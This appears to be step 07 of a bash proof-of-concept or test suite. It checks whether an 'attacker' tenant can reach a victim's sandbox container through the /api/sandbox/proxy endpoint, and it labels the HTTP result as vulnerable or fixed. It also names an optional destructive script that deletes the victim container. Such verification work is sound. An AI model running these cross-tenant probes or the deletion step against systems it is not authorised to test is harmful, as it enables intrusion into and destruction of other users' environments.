#!/usr/bin/env bash
# 07 — Attacker proxies HTTP into the victim's container.
# Vulnerable: anything other than 403/404 (often 200, 502 if nothing listens).
# Fixed:      403 (port not exposed in attacker's registry) or 404.
#
# A 502 here is STILL a finding: the handler reached the victim container
# and tried to dial it. Only 403/404 mean the ownership check held.
set -euo pipefail
# shellcheck source=_lib.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_lib.sh"

banner "07  Attacker proxies into victim container"
require_state attacker.json
require_state victim-container-name

victim_container="$(cat "${STATE_DIR}/victim-container-name")"
port="${EXPOSE_PORT}"
if [[ -f "${STATE_DIR}/exposed-port" ]]; then
  port="$(cat "${STATE_DIR}/exposed-port")"
fi
path="/api/sandbox/proxy/${victim_container}/${port}/"

body="$(api attacker GET "${path}")"
print_http
# Proxy responses may not be JSON.
echo "${body}" | head -c 2000
echo
echo "${body}" > "${STATE_DIR}/attacker-proxy.body"

http="$(last_http)"
echo
echo "  GET ${path}"

case "${http}" in
  403|404)
    verdict FIXED "proxy refused cross-tenant access (HTTP ${http})"
    ;;
  200)
    verdict VULNERABLE "attacker received HTTP 200 from inside victim container ${victim_container}:${port}"
    ;;
  502|504)
    verdict VULNERABLE "proxy reached victim container ${victim_container}:${port} (HTTP ${http} — dial/upstream failed, but no ownership check)"
    ;;
  *)
    verdict INCONCLUSIVE "unexpected HTTP ${http} on proxy; inspect .state/attacker-proxy.body"
    exit 1
    ;;
esac

echo
echo "Optional destructive proof:"
echo "  ./08-attacker-delete-container.sh"
echo "Skip 08 unless you are willing to destroy the victim sandbox."
